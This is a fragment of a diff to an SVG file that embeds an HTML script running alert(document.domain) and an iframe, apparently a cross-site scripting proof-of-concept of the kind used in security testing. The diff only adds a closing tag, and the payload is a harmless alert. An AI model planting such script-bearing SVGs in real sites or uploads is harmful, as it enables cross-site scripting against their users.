@@ -5,3 +5,4 @@ xmlns=”http://www.w3.org/2000/svg" xmlns:xlink=”http://www.w3.org/1999/xlink
 <html:script>alert(document.domain);</html:script>  
 <html:iframe src="https://example.com"></html:iframe>  
 </html>  
+</svg>
